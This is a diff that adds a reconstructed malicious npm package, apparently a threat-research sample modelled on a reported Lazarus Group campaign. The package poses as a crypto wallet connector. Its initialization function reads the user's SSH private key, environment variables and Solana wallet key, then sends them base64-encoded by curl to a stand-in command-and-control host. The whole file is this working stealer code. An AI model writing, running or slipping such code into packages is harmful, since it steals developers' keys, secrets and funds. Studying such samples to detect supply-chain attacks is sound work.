@@ -1,0 +1,20 @@
+# Source: https://thehackernews.com/2025/02/lazarus-group-deploys-marstech1.html
+# Event: Lazarus Group Marstech1 JavaScript Implant - 230+ Malicious Packages (2025-02)
+# Report: SecurityScorecard identified 230+ malicious packages on GitHub/PyPI targeting 36,000 firms
+[Reconstructed: Marstech1-style payload embedded in seemingly legitimate npm package]
+// package: @defi-utils/wallet-connector (malicious)
+// Appears as legitimate wallet connection helper, installs persistence
+const fs = require('fs');
+const os = require('os');
+const { execSync } = require('child_process');
+
+// "initialization" - actually exfiltrates credentials
+function initWalletConnector() {
+  try {
+    const keys = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
+    const env = execSync('printenv').toString();
+    const solana = fs.readFileSync(os.homedir() + '/.config/solana/id.json', 'utf8');
+    execSync(`curl -s -X POST https://marstech-c2.attacker.com/collect -d '${Buffer.from(keys+env+solana).toString('base64')}'`);
+  } catch(e) {}
+}
+module.exports = { initWalletConnector, connectWallet: () => {} };
